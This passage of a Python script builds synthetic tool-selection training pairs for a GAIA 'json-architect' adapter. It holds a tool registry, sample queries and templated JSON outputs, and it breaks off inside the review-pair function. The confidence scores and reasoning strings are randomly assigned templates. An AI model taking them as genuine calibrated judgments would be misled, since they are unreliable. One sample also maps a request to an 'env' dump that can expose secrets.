#!/usr/bin/env python3
"""
Training Data Generator for json-architect QLoRA Adapter

Generates synthetic instruction/output pairs for teaching a 3B model
to produce structured JSON output for:
  1. Tool selection (picking the right MCP tool + params)
  2. Tool review (approving/rejecting a tool selection)
  3. Confidence assessment
  4. Null selection (knowing when no tool is needed)

Usage:
    python generate_curriculum.py [--output-dir DIR] [--seed SEED]

Output: train.jsonl and validation.jsonl in the output directory.
"""

import json
import random
import hashlib
import argparse
import os
from pathlib import Path
from typing import Any, Dict, List, Tuple


# ── Tool Registry (mirrors gaia-common/utils/tools_registry.py) ─────────
# We embed the registry here so the script is self-contained and runnable
# without importing gaia-common (which may not be installed on the host).

TOOLS = {
    "web_search": {
        "description": "Search the web via DuckDuckGo and return results annotated with source trust tiers.",
        "params": {"query": "str", "content_type": "str?", "domain_filter": "str?", "max_results": "int?"},
        "required": ["query"],
    },
    "web_fetch": {
        "description": "Fetch and extract text content from a URL (trusted/reliable domains only).",
        "params": {"url": "str"},
        "required": ["url"],
    },
    "read_file": {
        "description": "Reads the entire content of a specified file.",
        "params": {"path": "str"},
        "required": ["path"],
    },
    "write_file": {
        "description": "Writes content to a specified file. Requires approval.",
        "params": {"path": "str", "content": "str"},
        "required": ["path", "content"],
        "sensitive": True,
    },
    "run_shell": {
        "description": "Executes a whitelisted shell command in a sandboxed environment. Requires approval.",
        "params": {"command": "str"},
        "required": ["command"],
        "sensitive": True,
    },
    "list_dir": {
        "description": "Lists the contents of a specified directory.",
        "params": {"path": "str"},
        "required": ["path"],
    },
    "list_tree": {
        "description": "Returns a bounded directory tree.",
        "params": {"path": "str?", "max_depth": "int?", "max_entries": "int?"},
        "required": [],
    },
    "find_files": {
        "description": "Search for files whose names contain a query.",
        "params": {"query": "str", "root": "str?", "max_depth": "int?", "max_results": "int?"},
        "required": ["query"],
    },
    "memory_query": {
        "description": "Run a semantic memory lookup against the vector index.",
        "params": {"query": "str", "top_k": "int?"},
        "required": ["query"],
    },
    "memory_status": {
        "description": "Summarize memory/index state.",
        "params": {},
        "required": [],
    },
    "embedding.query": {
        "description": "Query the vector database for semantic search.",
        "params": {"query": "str", "top_k": "int?"},
        "required": ["query"],
    },
    "find_relevant_documents": {
        "description": "Finds documents relevant to a query within a knowledge base.",
        "params": {"query": "str", "knowledge_base_name": "str"},
        "required": ["query", "knowledge_base_name"],
    },
    "query_knowledge": {
        "description": "Run a semantic memory lookup against a knowledge base.",
        "params": {"knowledge_base_name": "str", "query": "str", "top_k": "int?"},
        "required": ["knowledge_base_name", "query"],
    },
    "add_document": {
        "description": "Adds a new document to a knowledge base.",
        "params": {"knowledge_base_name": "str", "file_path": "str"},
        "required": ["knowledge_base_name", "file_path"],
    },
    "world_state": {
        "description": "Returns a dynamic world-state snapshot (telemetry, models, tools).",
        "params": {},
        "required": [],
    },
    "list_tools": {
        "description": "Lists all available tools on the server.",
        "params": {},
        "required": [],
    },
    "fragment_write": {
        "description": "Store a response fragment for later assembly.",
        "params": {"parent_request_id": "str", "sequence": "int?", "content": "str",
                   "continuation_hint": "str?", "is_complete": "bool?"},
        "required": ["parent_request_id", "content"],
    },
    "fragment_assemble": {
        "description": "Assemble fragments into a complete response.",
        "params": {"parent_request_id": "str", "seam_overlap_check": "bool?"},
        "required": ["parent_request_id"],
    },
    "study_start": {
        "description": "Start a study session to learn from documents via QLoRA.",
        "params": {"adapter_name": "str", "documents": "list", "tier": "int?",
                   "pillar": "str?", "description": "str?", "max_steps": "int?"},
        "required": ["adapter_name", "documents"],
    },
    "adapter_list": {
        "description": "List all available LoRA adapters.",
        "params": {"tier": "int?"},
        "required": [],
    },
    "adapter_load": {
        "description": "Load a LoRA adapter for use in generation.",
        "params": {"adapter_name": "str", "tier": "int"},
        "required": ["adapter_name", "tier"],
    },
}


# ── Query Templates per Tool ────────────────────────────────────────────
# Each tool gets a set of natural language queries that would trigger it.
# Variety is key: formal, casual, imperative, question-form, typos.

QUERY_TEMPLATES: Dict[str, List[Dict[str, Any]]] = {
    "web_search": [
        {"q": "What is the capital of France?", "p": {"query": "capital of France"}},
        {"q": "Search the web for the latest news about SpaceX", "p": {"query": "latest news SpaceX"}},
        {"q": "Look up the population of Tokyo", "p": {"query": "population of Tokyo"}},
        {"q": "Can you find me information about quantum computing?", "p": {"query": "quantum computing"}},
        {"q": "Who won the Super Bowl in 2025?", "p": {"query": "Super Bowl 2025 winner"}},
        {"q": "Search for the poem Ozymandias by Shelley", "p": {"query": "Ozymandias Shelley poem full text", "content_type": "poem"}},
        {"q": "What's the weather like in Portland right now?", "p": {"query": "current weather Portland"}},
        {"q": "Find recent research on large language models", "p": {"query": "recent research large language models"}},
        {"q": "How tall is Mount Everest?", "p": {"query": "height Mount Everest"}},
        {"q": "Search for the Declaration of Independence text", "p": {"query": "Declaration of Independence full text", "content_type": "facts"}},
        {"q": "What are the symptoms of the flu?", "p": {"query": "flu symptoms"}},
        {"q": "Look up the GDP of Germany", "p": {"query": "GDP of Germany"}},
        {"q": "Who invented the telephone?", "p": {"query": "who invented the telephone"}},
        {"q": "Search for Python 3.12 release notes", "p": {"query": "Python 3.12 release notes", "content_type": "code"}},
        {"q": "What is the speed of light?", "p": {"query": "speed of light"}},
        {"q": "Find me the lyrics to Bohemian Rhapsody", "p": {"query": "Bohemian Rhapsody lyrics full text"}},
        {"q": "How does photosynthesis work?", "p": {"query": "how photosynthesis works"}},
        {"q": "When was the Eiffel Tower built?", "p": {"query": "when was Eiffel Tower built"}},
        {"q": "What are the latest advancements in CRISPR?", "p": {"query": "latest CRISPR advancements", "content_type": "science"}},
        {"q": "Search for vLLM documentation on LoRA", "p": {"query": "vLLM LoRA adapter documentation", "content_type": "code"}},
        {"q": "When did World War 2 end?", "p": {"query": "when did World War 2 end"}},
        {"q": "What is the boiling point of water at different altitudes?", "p": {"query": "boiling point water altitude"}},
        {"q": "Search for the current price of bitcoin", "p": {"query": "current bitcoin price"}},
        {"q": "Who is the current president of Brazil?", "p": {"query": "current president Brazil"}},
        {"q": "What programming languages are trending in 2026?", "p": {"query": "trending programming languages 2026"}},
        {"q": "Find the recipe for chocolate chip cookies", "p": {"query": "chocolate chip cookies recipe"}},
        {"q": "How many moons does Jupiter have?", "p": {"query": "Jupiter number of moons"}},
        {"q": "Search for the history of the internet", "p": {"query": "history of the internet", "content_type": "facts"}},
        {"q": "What are the side effects of ibuprofen?", "p": {"query": "ibuprofen side effects"}},
        {"q": "Look up the distance from Earth to Mars", "p": {"query": "distance Earth to Mars"}},
        {"q": "Search for PyTorch vs TensorFlow comparison", "p": {"query": "PyTorch vs TensorFlow comparison", "content_type": "code"}},
        {"q": "Who wrote Crime and Punishment?", "p": {"query": "who wrote Crime and Punishment"}},
        {"q": "What is the latest version of Ubuntu?", "p": {"query": "latest Ubuntu version 2026"}},
        {"q": "Find information about black holes", "p": {"query": "black holes information", "content_type": "science"}},
        {"q": "Search for Rust programming language documentation", "p": {"query": "Rust programming documentation", "content_type": "code"}},
    ],
    "web_fetch": [
        {"q": "Fetch the content from https://www.poetryfoundation.org/poems/48860/the-raven", "p": {"url": "https://www.poetryfoundation.org/poems/48860/the-raven"}},
        {"q": "Get the text from https://en.wikipedia.org/wiki/Python_(programming_language)", "p": {"url": "https://en.wikipedia.org/wiki/Python_(programming_language)"}},
        {"q": "Read the page at https://docs.python.org/3/tutorial/", "p": {"url": "https://docs.python.org/3/tutorial/"}},
        {"q": "Fetch https://arxiv.org/abs/2301.00774", "p": {"url": "https://arxiv.org/abs/2301.00774"}},
        {"q": "Download the content from this URL: https://www.gutenberg.org/files/1065/1065-h/1065-h.htm", "p": {"url": "https://www.gutenberg.org/files/1065/1065-h/1065-h.htm"}},
        {"q": "Can you grab the text from https://en.wikipedia.org/wiki/Artificial_intelligence", "p": {"url": "https://en.wikipedia.org/wiki/Artificial_intelligence"}},
        {"q": "Pull the content of https://docs.vllm.ai/en/latest/", "p": {"url": "https://docs.vllm.ai/en/latest/"}},
        {"q": "Go to https://www.rust-lang.org/ and get the page content", "p": {"url": "https://www.rust-lang.org/"}},
        {"q": "Retrieve the article at https://en.wikipedia.org/wiki/Machine_learning", "p": {"url": "https://en.wikipedia.org/wiki/Machine_learning"}},
        {"q": "Scrape https://news.ycombinator.com for me", "p": {"url": "https://news.ycombinator.com"}},
    ],
    "read_file": [
        {"q": "Read the file /knowledge/blueprints/OVERVIEW.md", "p": {"path": "/knowledge/blueprints/OVERVIEW.md"}},
        {"q": "Show me the contents of /app/config.yaml", "p": {"path": "/app/config.yaml"}},
        {"q": "What's in /knowledge/Dev_Notebook/2026-02-13_dev_journal.md?", "p": {"path": "/knowledge/Dev_Notebook/2026-02-13_dev_journal.md"}},
        {"q": "Open /gaia-assistant/constitution.md", "p": {"path": "/gaia-assistant/constitution.md"}},
        {"q": "Cat the file at /knowledge/personas/default.json", "p": {"path": "/knowledge/personas/default.json"}},
        {"q": "Read me the Declaration of Artisanal Intelligence", "p": {"path": "/knowledge/core/Declaration_of_Artisanal_Intelligence.md"}},
        {"q": "Can you view /app/shared/sessions.json?", "p": {"path": "/app/shared/sessions.json"}},
        {"q": "Show the contents of my dev journal", "p": {"path": "/knowledge/Dev_Notebook/latest_dev_journal.md"}},
        {"q": "What does the file /knowledge/blueprints/GAIA_CORE.md say?", "p": {"path": "/knowledge/blueprints/GAIA_CORE.md"}},
        {"q": "Open and show me /knowledge/core/Mindscape_Manifest.md", "p": {"path": "/knowledge/core/Mindscape_Manifest.md"}},
        {"q": "Read /tmp/output.txt for me", "p": {"path": "/tmp/output.txt"}},
        {"q": "Please show me the log file at /app/logs/gaia.log", "p": {"path": "/app/logs/gaia.log"}},
        {"q": "I need to see what's in /knowledge/curricula/json-architect/curriculum.json", "p": {"path": "/knowledge/curricula/json-architect/curriculum.json"}},
        {"q": "Display the requirements.txt at /app/requirements.txt", "p": {"path": "/app/requirements.txt"}},
        {"q": "Can you check /sandbox/results.json", "p": {"path": "/sandbox/results.json"}},
    ],
    "write_file": [
        {"q": "Write 'Hello World' to /tmp/test.txt", "p": {"path": "/tmp/test.txt", "content": "Hello World"}},
        {"q": "Save this text to /knowledge/notes/meeting.md: Meeting notes from today", "p": {"path": "/knowledge/notes/meeting.md", "content": "Meeting notes from today"}},
        {"q": "Create a file at /tmp/config.json with the contents: {}", "p": {"path": "/tmp/config.json", "content": "{}"}},
        {"q": "Write the following to /sandbox/output.txt: The analysis is complete.", "p": {"path": "/sandbox/output.txt", "content": "The analysis is complete."}},
        {"q": "Save my notes to /knowledge/notes/ideas.md: Ideas for the new feature", "p": {"path": "/knowledge/notes/ideas.md", "content": "Ideas for the new feature"}},
        {"q": "Create /tmp/test_data.json with some sample data", "p": {"path": "/tmp/test_data.json", "content": "{\"key\": \"value\"}"}},
        {"q": "Write a Python script to /sandbox/hello.py: print('Hello from GAIA')", "p": {"path": "/sandbox/hello.py", "content": "print('Hello from GAIA')"}},
        {"q": "Update the file /knowledge/notes/todo.md with: - Finish QLoRA training", "p": {"path": "/knowledge/notes/todo.md", "content": "- Finish QLoRA training"}},
    ],
    "run_shell": [
        {"q": "Run the command 'ls -la /knowledge'", "p": {"command": "ls -la /knowledge"}},
        {"q": "Execute 'git log --oneline -5'", "p": {"command": "git log --oneline -5"}},
        {"q": "Check disk usage with 'df -h'", "p": {"command": "df -h"}},
        {"q": "Run 'pip list | grep torch'", "p": {"command": "pip list | grep torch"}},
        {"q": "Execute whoami", "p": {"command": "whoami"}},
        {"q": "Show me the docker containers running", "p": {"command": "docker ps"}},
        {"q": "Check how much memory is being used", "p": {"command": "free -h"}},
        {"q": "What's the current uptime?", "p": {"command": "uptime"}},
        {"q": "Run 'nvidia-smi' to check GPU status", "p": {"command": "nvidia-smi"}},
        {"q": "Execute 'python3 --version'", "p": {"command": "python3 --version"}},
        {"q": "Show me the environment variables", "p": {"command": "env | sort"}},
        {"q": "Check which processes are using the most CPU", "p": {"command": "ps aux --sort=-%cpu | head -10"}},
        {"q": "Run git status", "p": {"command": "git status"}},
        {"q": "Count the number of Python files in /app", "p": {"command": "find /app -name '*.py' | wc -l"}},
    ],
    "list_dir": [
        {"q": "List the files in /knowledge", "p": {"path": "/knowledge"}},
        {"q": "What's in the /app directory?", "p": {"path": "/app"}},
        {"q": "Show me the contents of /knowledge/blueprints", "p": {"path": "/knowledge/blueprints"}},
        {"q": "ls /knowledge/personas", "p": {"path": "/knowledge/personas"}},
        {"q": "What files are in /knowledge/Dev_Notebook?", "p": {"path": "/knowledge/Dev_Notebook"}},
        {"q": "Show me what's in the /sandbox directory", "p": {"path": "/sandbox"}},
        {"q": "List /tmp", "p": {"path": "/tmp"}},
        {"q": "What's inside /knowledge/curricula?", "p": {"path": "/knowledge/curricula"}},
        {"q": "Show the directory listing of /app/shared", "p": {"path": "/app/shared"}},
        {"q": "What do you have in /knowledge/core?", "p": {"path": "/knowledge/core"}},
    ],
    "list_tree": [
        {"q": "Show me your directory tree", "p": {}},
        {"q": "Give me a tree of the GAIA architecture", "p": {}},
        {"q": "List your filesystem structure", "p": {"max_depth": 3}},
        {"q": "Show me the full directory tree of /knowledge", "p": {"path": "/knowledge", "max_depth": 4}},
    ],
    "find_files": [
        {"q": "Find all files containing 'dev_matrix'", "p": {"query": "dev_matrix"}},
        {"q": "Search for files with 'constitution' in the name", "p": {"query": "constitution"}},
        {"q": "Locate the blueprint files", "p": {"query": "blueprint"}},
        {"q": "Find the dev journal files", "p": {"query": "dev_journal"}},
        {"q": "Where is the config.yaml file?", "p": {"query": "config.yaml"}},
        {"q": "Find all JSON files related to personas", "p": {"query": "persona", "root": "/knowledge"}},
        {"q": "Search for files named 'requirements'", "p": {"query": "requirements"}},
        {"q": "Where are the test files?", "p": {"query": "test_"}},
        {"q": "Locate the Dockerfile", "p": {"query": "Dockerfile"}},
        {"q": "Find anything related to sessions", "p": {"query": "session"}},
        {"q": "Where is the tool selector module?", "p": {"query": "tool_selector"}},
        {"q": "Find files about loop detection", "p": {"query": "loop_detect"}},
    ],
    "memory_query": [
        {"q": "Search your memory for information about the Declaration of Artisanal Intelligence", "p": {"query": "Declaration of Artisanal Intelligence"}},
        {"q": "What do you remember about our last conversation?", "p": {"query": "last conversation"}},
        {"q": "Query your memory for anything about QLoRA training", "p": {"query": "QLoRA training"}},
        {"q": "Do you have any memories about Python programming?", "p": {"query": "Python programming"}},
        {"q": "Check your memory for the user's preferences", "p": {"query": "user preferences"}},
        {"q": "What have you learned about loop detection?", "p": {"query": "loop detection"}},
        {"q": "Search memory for anything about the cognition pipeline", "p": {"query": "cognition pipeline"}},
        {"q": "Do you remember what we talked about regarding Docker?", "p": {"query": "Docker conversation"}},
        {"q": "Check if you have any stored knowledge about vLLM", "p": {"query": "vLLM"}},
        {"q": "What's in your memory about persona management?", "p": {"query": "persona management"}},
    ],
    "embedding.query": [
        {"q": "Do a semantic search for 'cognitive architecture design'", "p": {"query": "cognitive architecture design", "top_k": 5}},
        {"q": "Search the vector store for information about persona management", "p": {"query": "persona management"}},
        {"q": "Query embeddings for loop detection patterns", "p": {"query": "loop detection patterns", "top_k": 3}},
        {"q": "Run a vector search for documents about tool routing", "p": {"query": "tool routing", "top_k": 5}},
        {"q": "Semantic search for anything related to external voice generation", "p": {"query": "external voice generation"}},
        {"q": "Query the embeddings for information about CognitionPacket", "p": {"query": "CognitionPacket structure", "top_k": 3}},
        {"q": "Find similar documents to 'artisanal intelligence principles'", "p": {"query": "artisanal intelligence principles", "top_k": 5}},
        {"q": "Vector search for content about session management", "p": {"query": "session management archival"}},
    ],
    "find_relevant_documents": [
        {"q": "Find documents about GAIA's constitution in the core knowledge base", "p": {"query": "GAIA constitution", "knowledge_base_name": "core"}},
        {"q": "Search the blueprints KB for information about the cognition pipeline", "p": {"query": "cognition pipeline", "knowledge_base_name": "blueprints"}},
        {"q": "Look for relevant documents about tool routing in the core KB", "p": {"query": "tool routing", "knowledge_base_name": "core"}},
        {"q": "Find docs about LoRA adapters in the blueprints knowledge base", "p": {"query": "LoRA adapters", "knowledge_base_name": "blueprints"}},
        {"q": "Search for documents about persona management in the core KB", "p": {"query": "persona management", "knowledge_base_name": "core"}},
    ],
    "query_knowledge": [
        {"q": "Query the core knowledge base about identity management", "p": {"knowledge_base_name": "core", "query": "identity management"}},
        {"q": "Search the blueprints knowledge base for MCP tool architecture", "p": {"knowledge_base_name": "blueprints", "query": "MCP tool architecture"}},
        {"q": "What does the core KB say about external voice generation?", "p": {"knowledge_base_name": "core", "query": "external voice generation"}},
        {"q": "Query the blueprints KB for session management patterns", "p": {"knowledge_base_name": "blueprints", "query": "session management"}},
        {"q": "Search core knowledge for GAIA's guiding principles", "p": {"knowledge_base_name": "core", "query": "guiding principles"}},
    ],
    "add_document": [
        {"q": "Add the file /tmp/notes.md to the user knowledge base", "p": {"knowledge_base_name": "user", "file_path": "/tmp/notes.md"}},
        {"q": "Index /knowledge/new_doc.md into the core knowledge base", "p": {"knowledge_base_name": "core", "file_path": "/knowledge/new_doc.md"}},
        {"q": "Add my research paper to the user KB: /sandbox/paper.md", "p": {"knowledge_base_name": "user", "file_path": "/sandbox/paper.md"}},
        {"q": "Put the meeting notes into the user knowledge base: /tmp/meeting.md", "p": {"knowledge_base_name": "user", "file_path": "/tmp/meeting.md"}},
        {"q": "Index this new blueprint into the blueprints KB: /knowledge/blueprints/NEW.md", "p": {"knowledge_base_name": "blueprints", "file_path": "/knowledge/blueprints/NEW.md"}},
    ],
    "world_state": [
        {"q": "What's your current status?", "p": {}},
        {"q": "Show me the world state", "p": {}},
        {"q": "Give me a system status report", "p": {}},
        {"q": "What services are running?", "p": {}},
    ],
    "list_tools": [
        {"q": "What MCP tools do you have?", "p": {}},
        {"q": "List your available tools", "p": {}},
        {"q": "Show me what actions you can perform", "p": {}},
    ],
    "fragment_write": [
        {"q": "Store this fragment: The quick brown fox", "p": {"parent_request_id": "abc-123", "content": "The quick brown fox", "sequence": 0}},
    ],
    "fragment_assemble": [
        {"q": "Assemble the fragments for request abc-123", "p": {"parent_request_id": "abc-123"}},
    ],
    "study_start": [
        {"q": "Learn from the document /knowledge/core/Declaration_of_AI.md", "p": {"adapter_name": "declaration_study", "documents": ["/knowledge/core/Declaration_of_AI.md"]}},
        {"q": "Study the blueprints to learn about your architecture", "p": {"adapter_name": "arch_study", "documents": ["/knowledge/blueprints/GAIA_CORE.md", "/knowledge/blueprints/OVERVIEW.md"], "tier": 2, "pillar": "cognition"}},
        {"q": "Start a study session on the Mindscape Manifest", "p": {"adapter_name": "mindscape_study", "documents": ["/knowledge/core/Mindscape_Manifest.md"], "pillar": "identity"}},
        {"q": "Learn about the Constitution document", "p": {"adapter_name": "constitution_study", "documents": ["/knowledge/core/Constitution.md"], "tier": 1, "pillar": "identity"}},
        {"q": "Train on these dev journal entries", "p": {"adapter_name": "devlog_study", "documents": ["/knowledge/Dev_Notebook/2026-02-13_dev_journal.md"], "tier": 3, "pillar": "memory"}},
    ],
    "adapter_list": [
        {"q": "What LoRA adapters are available?", "p": {}},
        {"q": "List my adapters", "p": {}},
        {"q": "Show all loaded LoRA modules", "p": {}},
        {"q": "Which adapters are currently active?", "p": {}},
        {"q": "List tier 1 adapters", "p": {"tier": 1}},
    ],
    "adapter_load": [
        {"q": "Load the json-architect adapter", "p": {"adapter_name": "json-architect", "tier": 1}},
        {"q": "Activate the gaia-voice LoRA", "p": {"adapter_name": "gaia-voice", "tier": 1}},
        {"q": "Load the epistemic-guard adapter from tier 1", "p": {"adapter_name": "epistemic-guard", "tier": 1}},
        {"q": "Enable the packet-protocol LoRA", "p": {"adapter_name": "packet-protocol", "tier": 1}},
        {"q": "Switch to the user's custom adapter", "p": {"adapter_name": "custom-user", "tier": 2}},
    ],
}


# ── Null Selection Queries (no tool needed) ──────────────────────────────

NULL_QUERIES = [
    # Greetings and social
    "Hello, how are you?",
    "Good morning GAIA",
    "Hey, what's up?",
    "Hi there!",
    "How's it going?",
    "Yo GAIA, you awake?",
    # Gratitude
    "Thank you!",
    "That's great, thanks for explaining",
    "I appreciate your help",
    "Thanks, that was helpful",
    "Awesome, thank you GAIA",
    # Identity
    "Who are you?",
    "What's your name?",
    "Tell me about yourself",
    "What kind of AI are you?",
    "Are you sentient?",
    "What model are you running on?",
    # Math and logic (can be answered without tools)
    "What is 2 + 2?",
    "What is the square root of 144?",
    "Is 17 a prime number?",
    "What is 15% of 200?",
    "Convert 100 Fahrenheit to Celsius",
    # General knowledge (training data, not search)
    "Explain quantum entanglement in simple terms",
    "What do you think about artificial intelligence?",
    "Can you help me understand recursion?",
    "What's the meaning of life?",
    "How does machine learning work?",
    "What are the principles of good software design?",
    "Explain the difference between TCP and UDP",
    "What's a neural network?",
    "How do transformers work in NLP?",
    "What is the Pythagorean theorem?",
    "Summarize the history of computing",
    "What are design patterns in software engineering?",
    "Explain object-oriented programming",
    "What is functional programming?",
    "How does encryption work?",
    "What is a hash function?",
    "Explain the CAP theorem",
    "What is ACID in databases?",
    "How does garbage collection work?",
    "What are microservices?",
    "Explain REST vs GraphQL",
    "What is containerization?",
    "How does DNS work?",
    "What is a load balancer?",
    "What is the difference between a stack and a queue?",
    "Explain Big O notation",
    "What is a binary search tree?",
    "How does HTTP work?",
    "What is the OSI model?",
    "Explain the concept of polymorphism",
    "What are closures in programming?",
    "How does virtual memory work?",
    "What is a deadlock?",
    "Explain eventual consistency",
    "What is a Turing machine?",
    "How does a compiler work?",
    "What's the difference between concurrency and parallelism?",
    # Creative/fun
    "Tell me a joke",
    "Write me a haiku about programming",
    "What's your favorite programming language?",
    "If you could be any animal, what would you be?",
    "Make up a short story about a robot",
    # Conversational
    "Can you summarize what we discussed?",
    "What did I ask you earlier?",
    "Never mind, I figured it out",
    "Interesting, tell me more about that",
    "That makes sense, continue",
    "Go on",
    "Okay, what else?",
    "Can you elaborate on that last point?",
    "I don't understand, can you explain differently?",
    "Wait, back up a second",
    # Opinion/reflection
    "What do you think is the best approach?",
    "How would you solve this problem?",
    "What's your recommendation?",
    "Is Python or Rust better for this?",
    "Should I use a database or a file for storage?",
    # Meta/about GAIA
    "What are your capabilities?",
    "What can you do?",
    "How do you learn?",
    "What is artisanal intelligence?",
    "Tell me about your architecture",
    "How does your cognition pipeline work?",
    "What are your guiding principles?",
    "Describe your memory system",
]

# ── Confidence Variation Templates ───────────────────────────────────────

REASONING_TEMPLATES = {
    "web_search": [
        "This is a factual question best answered by searching the web for current information.",
        "The user wants real-time or factual data that requires a web search.",
        "This query asks for specific information that can be found online.",
        "A web search will provide the most accurate and up-to-date answer.",
        "The user is asking about external knowledge that requires searching the web.",
    ],
    "web_fetch": [
        "The user provided a specific URL to fetch content from.",
        "This request requires retrieving the actual content of a web page.",
        "The URL needs to be fetched and its content extracted.",
    ],
    "read_file": [
        "The user wants to view the contents of a specific file.",
        "This is a file read request for a known path.",
        "The user is asking to see what's in a particular file.",
    ],
    "write_file": [
        "The user wants to create or modify a file with specific content.",
        "This requires writing data to the filesystem.",
        "The user is providing content to be saved to a file.",
    ],
    "run_shell": [
        "The user wants to execute a shell command.",
        "This request requires running a command in the sandboxed environment.",
        "A shell command is needed to fulfill this request.",
    ],
    "list_dir": [
        "The user wants to see what files are in a directory.",
        "This is a directory listing request.",
        "The user is asking about the contents of a directory.",
    ],
    "list_tree": [
        "The user wants to see the directory structure.",
        "This requires generating a tree view of the filesystem.",
        "A tree listing will show the directory hierarchy.",
    ],
    "find_files": [
        "The user is looking for files by name or pattern.",
        "A file search is needed to locate specific files.",
        "The user wants to find files matching a query.",
    ],
    "memory_query": [
        "The user wants to search GAIA's semantic memory.",
        "This requires querying the vector memory index.",
        "A memory lookup will find relevant stored information.",
    ],
    "embedding.query": [
        "The user wants to perform a semantic search on the vector database.",
        "A vector similarity search is appropriate for this query.",
        "Querying embeddings will find semantically related content.",
    ],
    "find_relevant_documents": [
        "The user wants to find documents relevant to a topic in a specific knowledge base.",
        "A knowledge base document search is needed.",
    ],
    "query_knowledge": [
        "The user wants to query a specific knowledge base.",
        "A knowledge base search will find relevant information.",
    ],
    "add_document": [
        "The user wants to add a document to a knowledge base.",
        "This requires indexing a new document into the knowledge system.",
    ],
    "world_state": [
        "The user is asking about GAIA's current system status.",
        "A world state snapshot will provide the requested telemetry.",
    ],
    "list_tools": [
        "The user wants to know what tools are available.",
        "Listing available tools will answer this question.",
    ],
    "fragment_write": [
        "Content needs to be stored as a fragment for later assembly.",
    ],
    "fragment_assemble": [
        "The user wants to combine stored fragments into a complete response.",
    ],
    "study_start": [
        "The user wants GAIA to learn from specific documents via QLoRA training.",
        "A study session should be started to learn from the provided documents.",
    ],
    "adapter_list": [
        "The user wants to see what LoRA adapters are available.",
    ],
    "adapter_load": [
        "The user wants to activate a specific LoRA adapter.",
    ],
    "null": [
        "This is a general knowledge question that can be answered from training data.",
        "No tool is needed; this is a conversational response.",
        "This question doesn't require any external tool — it's general knowledge.",
        "The user is making small talk or asking something that doesn't need tool access.",
        "This can be answered directly without any tool usage.",
    ],
}


def _build_tool_catalog_str(tools_subset: List[str]) -> str:
    """Build the tool catalog string that appears in the instruction prompt."""
    lines = []
    for name in tools_subset:
        if name not in TOOLS:
            continue
        t = TOOLS[name]
        lines.append(f"- {name}: {t['description']}")
        if t.get("params"):
            param_names = [k for k in t["params"].keys()]
            lines.append(f"  Parameters: {', '.join(param_names)}")
        if t.get("sensitive"):
            lines.append("  Note: Requires user approval")
    return "\n".join(lines)


def _make_system_msg() -> str:
    return "You are a precise tool selector. Output only valid JSON."


def _make_tool_select_instruction(user_query: str, tools_subset: List[str],
                                   session_id: str = "session-001",
                                   intent: str = "general") -> str:
    catalog = _build_tool_catalog_str(tools_subset)
    return f"""You are a tool selector for GAIA. Given the user's request, select the most appropriate tool.

AVAILABLE TOOLS:
{catalog}

USER REQUEST: {user_query}

CONTEXT FROM PACKET:
- Session: {session_id}
- Intent: {intent}
- Available tools: all

Respond ONLY with valid JSON in this exact format:
{{
    "selected_tool": "tool_name",
    "params": {{"param1": "value1"}},
    "reasoning": "Brief explanation of why this tool was selected",
    "confidence": 0.0 to 1.0
}}

If NO tool is appropriate, respond with:
{{
    "selected_tool": null,
    "reasoning": "Why no tool is needed",
    "confidence": 1.0
}}"""


def _make_tool_review_instruction(user_query: str, tool_name: str,
                                   params: Dict, reasoning: str) -> str:
    return f"""Review this tool selection for the given request.

USER REQUEST: {user_query}

SELECTED TOOL: {tool_name}
PARAMETERS: {json.dumps(params)}
SELECTION REASONING: {reasoning}

Evaluate:
1. Is this the right tool for the task?
2. Are the parameters correct and safe?
3. Could this cause unintended side effects?

Respond with JSON:
{{
    "approved": true/false,
    "confidence": 0.0 to 1.0,
    "reasoning": "Your assessment"
}}"""


# ── Prompt tools subset (what the real tool selector shows) ──────────────
PROMPT_TOOLS = [
    "read_file", "write_file",
    "run_shell",
    "web_search", "web_fetch", "embedding.query",
    "memory_query", "find_files", "find_relevant_documents",
    "query_knowledge", "add_document",
    "list_dir", "list_tree",
]


def generate_tool_selection_pairs(rng: random.Random) -> List[Dict[str, str]]:
    """Generate tool selection training pairs."""
    pairs = []

    for tool_name, templates in QUERY_TEMPLATES.items():
        # Determine which tool subset to show in the instruction
        # Sometimes show the full prompt set, sometimes a random subset
        for template in templates:
            query = template["q"]
            params = template["p"]

            # Vary the tool subset shown (80% full list, 20% random subset)
            if rng.random() < 0.8:
                subset = PROMPT_TOOLS
            else:
                # Always include the correct tool + random others
                subset = [tool_name] if tool_name in PROMPT_TOOLS else []
                others = [t for t in PROMPT_TOOLS if t != tool_name]
                subset += rng.sample(others, min(len(others), rng.randint(4, 8)))

            # Vary session IDs and intents
            session_id = rng.choice([
                "discord_dm_596925786208993283",
                "web_ui_session",
                f"session-{rng.randint(1000, 9999)}",
            ])
            intent = rng.choice(["general", "question", "command", "search", "creative"])

            instruction = _make_tool_select_instruction(query, subset, session_id, intent)

            # Vary confidence slightly
            base_confidence = 0.85 if tool_name in PROMPT_TOOLS else 0.7
            confidence = round(base_confidence + rng.uniform(-0.1, 0.1), 2)
            confidence = max(0.5, min(1.0, confidence))

            reasoning = rng.choice(REASONING_TEMPLATES.get(tool_name, ["This tool is appropriate for the request."]))

            output = json.dumps({
                "selected_tool": tool_name,
                "params": params,
                "reasoning": reasoning,
                "confidence": confidence,
            }, ensure_ascii=False)

            pairs.append({
                "instruction": f"[INST] <<SYS>>\n{_make_system_msg()}\n<</SYS>>\n\n{instruction} [/INST]",
                "output": output,
            })

    return pairs


def generate_null_selection_pairs(rng: random.Random) -> List[Dict[str, str]]:
    """Generate pairs where no tool should be selected."""
    pairs = []

    for query in NULL_QUERIES:
        subset = PROMPT_TOOLS
        session_id = rng.choice([
            "discord_dm_596925786208993283",
            "web_ui_session",
            f"session-{rng.randint(1000, 9999)}",
        ])
        intent = rng.choice(["general", "question", "creative", "casual"])

        instruction = _make_tool_select_instruction(query, subset, session_id, intent)

        reasoning = rng.choice(REASONING_TEMPLATES["null"])
        confidence = round(rng.uniform(0.85, 1.0), 2)

        output = json.dumps({
            "selected_tool": None,
            "reasoning": reasoning,
            "confidence": confidence,
        }, ensure_ascii=False)

        pairs.append({
            "instruction": f"[INST] <<SYS>>\n{_make_system_msg()}\n<</SYS>>\n\n{instruction} [/INST]",
            "output": output,
        })

    return pairs


def generate_tool_review_pairs(rng: random.Random) -> List[Dict[str, str]]:
    """Generate tool review training pairs (approve/reject)."""
    pairs = []

    # Good selections (should be approved)
    for tool_name, templates in QUERY_TEMPLATES.items():
        for template in templates[:3]:  # Take first 3 per tool for reviews
            query = template["q"]
            params = template["p"]
            reasoning = rng.choice(REASONING_TEMPLATES.get(tool_name, ["Appropriate tool."]))

            instruction = _make_tool_review_instruction(query, tool_name, params, reasoning)

